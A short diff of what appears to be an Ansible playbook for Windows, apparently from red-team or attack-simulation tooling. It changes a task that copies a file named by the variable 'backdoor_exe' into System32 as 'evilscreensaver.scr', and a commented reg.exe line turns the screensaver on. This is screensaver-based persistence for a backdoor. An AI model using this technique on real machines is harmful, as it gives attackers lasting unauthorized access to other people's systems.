@@ -6,9 +6,7 @@
   tasks:
         - name:
           tags: always
-          win_copy:
-            src: "{{ backdoor_exe }}"
-            dest: c:\Windows\System32\evilscreensaver.scr
+          win_command: copy "{{ backdoor_exe }}"  c:\Windows\System32\evilscreensaver.scr
         - name: Activate Screen saver
           #reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
           tags: always
